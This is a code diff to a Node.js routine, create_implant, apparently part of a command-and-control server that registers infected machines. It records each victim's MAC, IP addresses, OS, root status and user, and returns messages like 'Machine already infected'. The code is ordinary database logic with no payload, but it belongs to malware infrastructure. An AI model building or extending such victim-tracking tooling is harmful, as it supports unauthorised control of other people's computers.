@@ -4,12 +4,7 @@ import Implant from '../models/Implant_model.mjs';
 const create_implant = async( body ) => {
     let errors=[];
 
-    console.log("Registrando implante");
-    
-    console.log(body);
-    
     try {
-        
         const { 
             impl_mac,
             impl_number,
@@ -17,14 +12,37 @@ const create_implant = async( body ) => {
             public_ip,
             local_ip,
             operating_system,
-            token,
-            impl_id
+            impl_id,
+            root,
+            user
         } = body;
 
-        
 
+        const rootBool = root == "True" || root == true ? true : false;
 
-        const implan_by_model = await Implant.findOneAndUpdate(
+        const data = {
+            impl_mac,
+            impl_number,
+            group,
+            public_ip,
+            local_ip,
+            operating_system,
+            impl_id:impl_id.replace('/','-').replace('\\','-').replace(/\s+/g, "") ,
+            root:rootBool,
+            user
+        }
+
+        const implan_by_model = await Implant.findOne(data)
+
+        if( !implan_by_model ){
+            const new_imp = new Implant(data);
+            await new_imp.save();
+        }else{
+            errors.push("Profile already compromised");
+        }
+
+/* 
+        const implan_by_model_to_update = await Implant.findOneAndUpdate(
             { impl_id },         
             { $set: {
                 impl_mac,
@@ -32,23 +50,22 @@ const create_implant = async( body ) => {
                 group,
                 local_ip,
                 operating_system,
-                token,
+                root,
+                user
             } }, 
             {
                 new: true,    
                 upsert: true, 
             }
         );
-
+ */
 
         if(errors.length > 0) return { errors };
-        //const jwt = await new_jwt_implant();
 
         return {errors};
     } catch (error) {
         
         if (error.code === 11000) {
-            // Error de clave duplicada
             errors.push("Machine already infected");
             console.log("Machine already infected");
             return {errors, jwt:""};
